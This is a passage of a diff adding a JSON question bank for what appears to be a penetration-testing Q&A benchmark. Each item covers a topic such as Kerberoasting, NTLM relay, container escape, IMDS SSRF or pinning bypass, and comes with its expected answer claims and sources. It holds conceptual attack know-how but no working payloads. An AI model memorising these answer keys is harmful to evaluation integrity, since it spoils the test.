+      "Reverse proxies must strip or overwrite untrusted upstream proxy headers"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-026",
+    "question": "How does Android exported component abuse work when activities, services, or broadcast receivers set android:exported='true'?",
+    "domain": "MOBILE",
+    "subdomain": "ANDROID_EXPORTED_COMPONENTS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Android",
+      "android:exported",
+      "Activity",
+      "BroadcastReceiver",
+      "Service",
+      "IPC",
+      "Intent Filter"
+    ],
+    "expected_answer_characteristics": [
+      "Exported components are accessible to any third-party app on the device",
+      "Omitting permission checks allows rogue apps to invoke sensitive flows or steal data"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Android Security Documentation",
+      "OWASP MASTG-TEST-0001",
+      "CWE-926"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Android Security Documentation",
+      "OWASP MASTG-TEST-0001",
+      "CWE-926"
+    ],
+    "expected_claims": [
+      "Exported components are accessible to any third-party app on the device",
+      "Omitting permission checks allows rogue apps to invoke sensitive flows or steal data"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-027",
+    "question": "Explain how unvalidated Android Deep Links and App Links can lead to arbitrary Account Takeover or sensitive data theft.",
+    "domain": "MOBILE",
+    "subdomain": "ANDROID_DEEP_LINKS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Deep Links",
+      "App Links",
+      "intent-filter",
+      "scheme",
+      "host",
+      "WebView token leak"
+    ],
+    "expected_answer_characteristics": [
+      "Custom URL schemes without App Link assetlinks.json verification can be claimed by malicious apps",
+      "Parameters passed into exported handlers without sanitization enable CSRF or token theft"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP MASTG",
+      "Android App Links Documentation"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "attack_chain_reasoning",
+    "expected_sources": [
+      "OWASP MASTG",
+      "Android App Links Documentation"
+    ],
+    "expected_claims": [
+      "Custom URL schemes without App Link assetlinks.json verification can be claimed by malicious apps",
+      "Parameters passed into exported handlers without sanitization enable CSRF or token theft"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-028",
+    "question": "What is SSL/TLS Certificate Pinning in mobile apps, and what are standard dynamic hooking techniques used to bypass it during security testing?",
+    "domain": "MOBILE",
+    "subdomain": "CERTIFICATE_PINNING",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Certificate Pinning",
+      "TrustManager",
+      "Frida",
+      "Dynamic Hooking",
+      "Network Security Config"
+    ],
+    "expected_answer_characteristics": [
+      "Pinning validates server certificate against hardcoded public key hash",
+      "Frida hooks TrustManager or SSL_CTX to force positive validation during testing"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP MASTG-NETWORK-4",
+      "Android Network Security Config"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "OWASP MASTG-NETWORK-4",
+      "Android Network Security Config"
+    ],
+    "expected_claims": [
+      "Pinning validates server certificate against hardcoded public key hash",
+      "Frida hooks TrustManager or SSL_CTX to force positive validation during testing"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-029",
+    "question": "Explain the security risks of enabling setJavaScriptEnabled(true) and addJavascriptInterface in Android WebViews targeting legacy API levels.",
+    "domain": "MOBILE",
+    "subdomain": "ANDROID_WEBVIEW",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Android WebView",
+      "addJavascriptInterface",
+      "setJavaScriptEnabled",
+      "@JavascriptInterface",
+      "Reflection RCE"
+    ],
+    "expected_answer_characteristics": [
+      "addJavascriptInterface exposes Java objects to JavaScript execution context",
+      "Prior to Android 4.2 (API 17), lack of @JavascriptInterface allowed arbitrary reflection RCE"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Android Developers Reference",
+      "CWE-749",
+      "OWASP MASTG"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "Android Developers Reference",
+      "CWE-749",
+      "OWASP MASTG"
+    ],
+    "expected_claims": [
+      "addJavascriptInterface exposes Java objects to JavaScript execution context",
+      "Prior to Android 4.2 (API 17), lack of @JavascriptInterface allowed arbitrary reflection RCE"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-030",
+    "question": "Describe the internal structure of an Android APK file and explain the role of AndroidManifest.xml, classes.dex, and resources.arsc.",
+    "domain": "MOBILE",
+    "subdomain": "APK_STRUCTURE",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "APK Structure",
+      "AndroidManifest.xml",
+      "classes.dex",
+      "resources.arsc",
+      "META-INF",
+      "Dalvik bytecode"
+    ],
+    "expected_answer_characteristics": [
+      "APK is a ZIP archive containing compiled DEX bytecode, manifest, and binary XML resources",
+      "AndroidManifest.xml declares package permissions, components, and hardware requirements"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Android Developer Guides",
+      "OWASP MASTG-STORAGE-1"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Android Developer Guides",
+      "OWASP MASTG-STORAGE-1"
+    ],
+    "expected_claims": [
+      "APK is a ZIP archive containing compiled DEX bytecode, manifest, and binary XML resources",
+      "AndroidManifest.xml declares package permissions, components, and hardware requirements"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-031",
+    "question": "How does a DNS Rebinding attack bypass Same-Origin Policy (SOP) to interact with internal private network services?",
+    "domain": "NETWORK",
+    "subdomain": "DNS_REBINDING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "DNS Rebinding",
+      "Same-Origin Policy",
+      "DNS TTL",
+      "127.0.0.1",
+      "Private IP ranges",
+      "Host Header validation"
+    ],
+    "expected_answer_characteristics": [
+      "Attacker server provides short TTL (0s) resolving first to external IP, then rebinds to 127.0.0.1",
+      "Browser retains origin name allowing subsequent requests to target local service",
+      "Mitigated by strict HTTP Host header validation on local services"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP DNS Rebinding",
+      "CWE-350"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "OWASP DNS Rebinding",
+      "CWE-350"
+    ],
+    "expected_claims": [
+      "Attacker server provides short TTL (0s) resolving first to external IP, then rebinds to 127.0.0.1",
+      "Browser retains origin name allowing subsequent requests to target local service",
+      "Mitigated by strict HTTP Host header validation on local services"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-032",
+    "question": "Explain the cryptographic stages of the TLS 1.3 handshake and contrast it with TLS 1.2 in terms of latency and cipher suite negotiation.",
+    "domain": "NETWORK",
+    "subdomain": "TLS_HANDSHAKE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "TLS 1.3",
+      "TLS 1.2",
+      "ClientHello",
+      "Key Share",
+      "0-RTT",
+      "Forward Secrecy",
+      "Ephemeral Diffie-Hellman"
+    ],
+    "expected_answer_characteristics": [
+      "TLS 1.3 reduces handshake latency to 1-RTT by combining key share in ClientHello",
+      "Removes legacy static RSA key exchange and weak CBC ciphers, mandating ephemeral Diffie-Hellman"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 8446",
+      "NIST SP 800-52"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "RFC 8446",
+      "NIST SP 800-52"
+    ],
+    "expected_claims": [
+      "TLS 1.3 reduces handshake latency to 1-RTT by combining key share in ClientHello",
+      "Removes legacy static RSA key exchange and weak CBC ciphers, mandating ephemeral Diffie-Hellman"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-033",
+    "question": "Explain how TCP SYN flood attacks exploit TCP half-open connection queues and how SYN Cookies mitigate the vulnerability.",
+    "domain": "NETWORK",
+    "subdomain": "TCP_SYN_FLOOD",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "TCP SYN Flood",
+      "Three-way handshake",
+      "SYN queue",
+      "SYN Cookies",
+      "RFC 4987"
+    ],
+    "expected_answer_characteristics": [
+      "Attacker floods SYN packets without sending final ACK, filling connection backlog",
+      "SYN Cookies encode connection state cryptographically in sequence number without allocating memory"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 4987",
+      "CWE-400"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "RFC 4987",
+      "CWE-400"
+    ],
+    "expected_claims": [
+      "Attacker floods SYN packets without sending final ACK, filling connection backlog",
+      "SYN Cookies encode connection state cryptographically in sequence number without allocating memory"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-034",
+    "question": "How do SSRF attacks against AWS EC2 Instance Metadata Service (IMDSv1 vs IMDSv2) enable IAM credential theft, and how does IMDSv2 mitigate it?",
+    "domain": "CLOUD",
+    "subdomain": "IMDS_SSRF",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "AWS IMDS",
+      "169.254.169.254",
+      "IMDSv1",
+      "IMDSv2",
+      "Session Token",
+      "X-aws-ec2-metadata-token",
+      "SSRF"
+    ],
+    "expected_answer_characteristics": [
+      "IMDSv1 allows simple GET requests to retrieve IAM role security credentials",
+      "IMDSv2 requires PUT request with X-aws-ec2-metadata-token-ttl-seconds header to fetch session token",
+      "Standard web SSRF cannot issue custom PUT header, blocking token retrieval"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "AWS Documentation",
+      "OWASP SSRF Cheat Sheet"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "attack_chain_reasoning",
+    "expected_sources": [
+      "AWS Documentation",
+      "OWASP SSRF Cheat Sheet"
+    ],
+    "expected_claims": [
+      "IMDSv1 allows simple GET requests to retrieve IAM role security credentials",
+      "IMDSv2 requires PUT request with X-aws-ec2-metadata-token-ttl-seconds header to fetch session token",
+      "Standard web SSRF cannot issue custom PUT header, blocking token retrieval"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-035",
+    "question": "What are common misconfigurations in Kubernetes Role-Based Access Control (RBAC) that lead to cluster privilege escalation?",
+    "domain": "CLOUD",
+    "subdomain": "KUBERNETES_RBAC",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Kubernetes RBAC",
+      "ClusterRole",
+      "ClusterRoleBinding",
+      "ServiceAccount",
+      "pods/exec",
+      "secrets"
+    ],
+    "expected_answer_characteristics": [
+      "Granting pods/exec or create pods permissions allows running container with hostPath mount to node root filesystem",
+      "Service accounts with get/list secrets permissions can steal cluster-admin tokens"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Kubernetes Documentation",
+      "CIS Kubernetes Benchmark"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Kubernetes Documentation",
+      "CIS Kubernetes Benchmark"
+    ],
+    "expected_claims": [
+      "Granting pods/exec or create pods permissions allows running container with hostPath mount to node root filesystem",
+      "Service accounts with get/list secrets permissions can steal cluster-admin tokens"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-036",
+    "question": "How does a container escape vulnerability function when a container is run with --privileged or CAP_SYS_ADMIN capabilities?",
+    "domain": "CLOUD",
+    "subdomain": "CONTAINER_ESCAPE",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Container Escape",
+      "--privileged",
+      "cgroups",
+      "release_agent",
+      "CAP_SYS_ADMIN",
+      "Docker escape"
+    ],
+    "expected_answer_characteristics": [
+      "Running with --privileged disables AppArmor/Seccomp and grants all Linux capabilities",
+      "Attacker mounts cgroup controller and configures release_agent script to execute on host as root"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Docker Security Documentation",
+      "Linux Capabilities man-pages"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Docker Security Documentation",
+      "Linux Capabilities man-pages"
+    ],
+    "expected_claims": [
+      "Running with --privileged disables AppArmor/Seccomp and grants all Linux capabilities",
+      "Attacker mounts cgroup controller and configures release_agent script to execute on host as root"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-037",
+    "question": "How does Kerberos authentication work in Active Directory (AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ) and what is a TGT?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "KERBEROS_AUTHENTICATION",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Kerberos",
+      "Active Directory",
+      "KDC",
+      "AS-REQ",
+      "AS-REP",
+      "TGT",
+      "TGS-REQ",
+      "TGS-REP",
+      "Ticket Granting Ticket"
+    ],
+    "expected_answer_characteristics": [
+      "Client sends AS-REQ with timestamp encrypted with user secret to KDC",
+      "KDC returns AS-REP with TGT encrypted with krbtgt key",
+      "Client presents TGT in TGS-REQ to request service tickets"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 4120",
+      "Microsoft MS-KILE Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "RFC 4120",
+      "Microsoft MS-KILE Documentation"
+    ],
+    "expected_claims": [
+      "Client sends AS-REQ with timestamp encrypted with user secret to KDC",
+      "KDC returns AS-REP with TGT encrypted with krbtgt key",
+      "Client presents TGT in TGS-REQ to request service tickets"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-038",
+    "question": "Explain the Kerberoasting attack technique. Why does any authenticated domain user have the ability to request service tickets for SPNs?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "KERBEROASTING",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Kerberoasting",
+      "SPN",
+      "Service Principal Name",
+      "TGS-REP",
+      "RC4",
+      "Offline Cracking",
+      "Active Directory"
+    ],
+    "expected_answer_characteristics": [
+      "Any domain user can request a TGS ticket for accounts registered with an SPN",
+      "The ticket payload is encrypted with the service account password hash, allowing offline cracking"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "MITRE ATT&CK T1558.003",
+      "Microsoft Security Advisories"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "MITRE ATT&CK T1558.003",
+      "Microsoft Security Advisories"
+    ],
+    "expected_claims": [
+      "Any domain user can request a TGS ticket for accounts registered with an SPN",
+      "The ticket payload is encrypted with the service account password hash, allowing offline cracking"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-039",
+    "question": "How does an NTLM Relay attack operate and what defenses (SMB Signing, EPA, LDAP Channel Binding) prevent relaying to administrative services?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "NTLM_RELAY",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "NTLM Relay",
+      "SMB Signing",
+      "Extended Protection for Authentication (EPA)",
+      "LDAP Channel Binding",
+      "Coerce Authentication"
+    ],
+    "expected_answer_characteristics": [
+      "Attacker coerces NTLM authentication and relays challenge-response tokens to target service",
+      "SMB Signing and LDAP Channel Binding bind connection state cryptographically, breaking unauthenticated relay"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Security Documentation",
+      "MITRE ATT&CK T1557.001"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "attack_chain_reasoning",
+    "expected_sources": [
+      "Microsoft Security Documentation",
+      "MITRE ATT&CK T1557.001"
+    ],
+    "expected_claims": [
+      "Attacker coerces NTLM authentication and relays challenge-response tokens to target service",
+      "SMB Signing and LDAP Channel Binding bind connection state cryptographically, breaking unauthenticated relay"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-040",
+    "question": "What is AS-REP Roasting and what Active Directory account setting exposes user hashes to pre-authentication attacks?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "ASREPROASTING",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "AS-REP Roasting",
+      "DONT_REQ_PREAUTH",
+      "Kerberos Pre-authentication",
+      "AS-REP",
+      "Offline Hash Cracking"
+    ],
+    "expected_answer_characteristics": [
+      "Accounts with DONT_REQ_PREAUTH flag return AS-REP without prior authentication",
+      "The returned encrypted timestamp can be cracked offline without generating logon failure events"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "MITRE ATT&CK T1558.004",
+      "Microsoft AD Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "MITRE ATT&CK T1558.004",
+      "Microsoft AD Documentation"
+    ],
+    "expected_claims": [
+      "Accounts with DONT_REQ_PREAUTH flag return AS-REP without prior authentication",
+      "The returned encrypted timestamp can be cracked offline without generating logon failure events"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-041",
+    "question": "Explain Linux Capabilities (e.g. CAP_SETUID, CAP_NET_RAW, CAP_SYS_PTRACE) and how they partition traditional root privileges.",
+    "domain": "LINUX",
+    "subdomain": "LINUX_CAPABILITIES",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Linux Capabilities",
+      "CAP_SETUID",
+      "CAP_SYS_ADMIN",
+      "capabilities(7)",
+      "Privilege Separation"
+    ],
+    "expected_answer_characteristics": [
+      "Capabilities divide monolithic root user authority into distinct independent privileges",
+      "Binaries with setcap can execute sensitive operations without full SUID root access"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Linux man-pages capabilities(7)",
+      "CWE-250"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Linux man-pages capabilities(7)",
+      "CWE-250"
+    ],
+    "expected_claims": [
+      "Capabilities divide monolithic root user authority into distinct independent privileges",
+      "Binaries with setcap can execute sensitive operations without full SUID root access"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-042",
+    "question": "How do misconfigured SUID binaries or GTFOBins enable local privilege escalation on Linux hosts?",
+    "domain": "LINUX",
+    "subdomain": "SUID_BINARIES",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "SUID",
+      "GTFOBins",
+      "chmod u+s",
+      "Local Privilege Escalation",
+      "PATH hijacking"
+    ],
+    "expected_answer_characteristics": [
+      "SUID files execute with the file owner's privileges regardless of calling user",
+      "If an SUID binary executes interactive shells or unquoted relative PATH commands, root escalation occurs"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-732",
+      "GTFOBins Repository"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "CWE-732",
+      "GTFOBins Repository"
+    ],
+    "expected_claims": [
+      "SUID files execute with the file owner's privileges regardless of calling user",
+      "If an SUID binary executes interactive shells or unquoted relative PATH commands, root escalation occurs"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-043",
+    "question": "What is a classic Stack-Based Buffer Overflow, how does it overwrite the saved instruction pointer (RIP/EIP), and how does stack canary mitigate it?",
+    "domain": "BINARY_RE",
+    "subdomain": "BUFFER_OVERFLOW",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Stack Buffer Overflow",
+      "Saved EIP/RIP",
+      "Stack Canary",
+      "Stack frame",
+      "strcpy"
+    ],
+    "expected_answer_characteristics": [
+      "Writing beyond allocated stack buffer boundaries overwrites saved return address",
+      "Stack canary places secret value before return address; deviation causes __stack_chk_fail termination"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-121",
+      "Phrack 49: Smashing The Stack For Fun And Profit"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "CWE-121",
+      "Phrack 49: Smashing The Stack For Fun And Profit"
+    ],
+    "expected_claims": [
+      "Writing beyond allocated stack buffer boundaries overwrites saved return address",
+      "Stack canary places secret value before return address; deviation causes __stack_chk_fail termination"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-044",
+    "question": "Compare modern binary mitigations: ASLR, DEP/NX, Stack Canaries, and RELRO in terms of attack vectors they disrupt.",
+    "domain": "BINARY_RE",
+    "subdomain": "BINARY_MITIGATIONS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "ASLR",
+      "DEP/NX",
+      "Stack Canaries",
+      "RELRO",
+      "W^X",
+      "ROP chains"
+    ],
+    "expected_answer_characteristics": [
+      "DEP/NX prevents executing code in data segments like stack/heap",
+      "ASLR randomizes memory address layouts to disrupt hardcoded jumps",
+      "RELRO protects Global Offset Table (GOT) from overwrite"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "GCC Documentation",
+      "CWE-119"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "GCC Documentation",
+      "CWE-119"
+    ],
+    "expected_claims": [
+      "DEP/NX prevents executing code in data segments like stack/heap",
+      "ASLR randomizes memory address layouts to disrupt hardcoded jumps",
+      "RELRO protects Global Offset Table (GOT) from overwrite"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-045",
+    "question": "Explain Return-Oriented Programming (ROP) gadgets and how attackers construct ROP chains to bypass non-executable stack (DEP/NX).",
+    "domain": "BINARY_RE",
+    "subdomain": "RETURN_ORIENTED_PROGRAMMING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "ROP",
+      "ROP Gadgets",
+      "DEP/NX bypass",
+      "ret instruction",
+      "mprotect"
+    ],
+    "expected_answer_characteristics": [
+      "Attackers chain small snippets of existing executable code ending in ret",
+      "Sequential gadgets set registers and invoke syscalls (e.g. mprotect or execve) without injecting new shellcode"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Hovav Shacham: The Geometry of Innocent Flesh on the Bone",
+      "CWE-119"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Hovav Shacham: The Geometry of Innocent Flesh on the Bone",
+      "CWE-119"
+    ],
+    "expected_claims": [
+      "Attackers chain small snippets of existing executable code ending in ret",
+      "Sequential gadgets set registers and invoke syscalls (e.g. mprotect or execve) without injecting new shellcode"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-046",
+    "question": "Describe the Executable and Linkable Format (ELF) structure, highlighting the purpose of Program Headers, Section Headers, and the GOT/PLT.",
+    "domain": "BINARY_RE",
+    "subdomain": "ELF_STRUCTURE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "ELF",
+      "Program Headers",
+      "Section Headers",
+      ".text",
+      ".got",
+      ".plt",
+      "Dynamic Linking"
+    ],
+    "expected_answer_characteristics": [
+      "Program Headers describe runtime segments for execution; Section Headers describe linkable object structure",
+      "GOT and PLT enable lazy dynamic symbol resolution for external shared libraries"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "ELF Specifications",
+      "Linux man-pages elf(5)"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "ELF Specifications",
+      "Linux man-pages elf(5)"
+    ],
+    "expected_claims": [
+      "Program Headers describe runtime segments for execution; Section Headers describe linkable object structure",
+      "GOT and PLT enable lazy dynamic symbol resolution for external shared libraries"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-047",
+    "question": "Explain why ECB mode in AES encryption is insecure and identify the security guarantees provided by authenticated encryption modes like AES-GCM.",
+    "domain": "SECURE_CODING",
+    "subdomain": "CRYPTO_MISTAKES",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "AES-ECB",
+      "AES-GCM",
+      "Electronic Codebook",
+      "Deterministic encryption",
+      "Authenticated Encryption with Associated Data (AEAD)"
+    ],
+    "expected_answer_characteristics": [
+      "ECB mode encrypts identical plaintext blocks into identical ciphertext blocks, leaking structural patterns",
+      "AES-GCM provides confidentiality and cryptographic integrity verification via authentication tag"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "NIST SP 800-38A",
+      "NIST SP 800-38D",
+      "CWE-327"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "NIST SP 800-38A",
+      "NIST SP 800-38D",
+      "CWE-327"
+    ],
+    "expected_claims": [
+      "ECB mode encrypts identical plaintext blocks into identical ciphertext blocks, leaking structural patterns",
+      "AES-GCM provides confidentiality and cryptographic integrity verification via authentication tag"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-048",
+    "question": "Map SQL Injection, OS Command Injection, and Path Traversal to their canonical CWE identifiers and root weaknesses.",
+    "domain": "SECURE_CODING",
+    "subdomain": "CWE_MAPPING",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "CWE-89",
+      "CWE-78",
+      "CWE-22",
+      "Improper Neutralization",
+      "Special Elements"
+    ],
+    "expected_answer_characteristics": [
+      "SQLi maps to CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)",
+      "OS Command Injection maps to CWE-78 (OS Command Injection)",
+      "Path Traversal maps to CWE-22 (Improper Limitation of a Pathname)"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "MITRE CWE List"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "cwe_mapping",
+    "expected_sources": [
+      "MITRE CWE List"
+    ],
+    "expected_claims": [
+      "SQLi maps to CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)",
+      "OS Command Injection maps to CWE-78 (OS Command Injection)",
+      "Path Traversal maps to CWE-22 (Improper Limitation of a Pathname)"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-049",
+    "question": "What are secure coding best practices for handling API keys, private certificates, and database credentials in production applications?",
+    "domain": "SECURE_CODING",
+    "subdomain": "SECRET_MANAGEMENT",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Secret Management",
+      "Hardcoded credentials",
+      "Environment variables",
+      "Key Vault",
+      "KMS",
+      "Secret Rotation"
+    ],
+    "expected_answer_characteristics": [
+      "Never commit credentials to version control or hardcode in application artifacts",
+      "Utilize dedicated secret managers with fine-grained access policies and automatic rotation"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Secrets Management Cheat Sheet",
+      "CWE-798"
+    ],
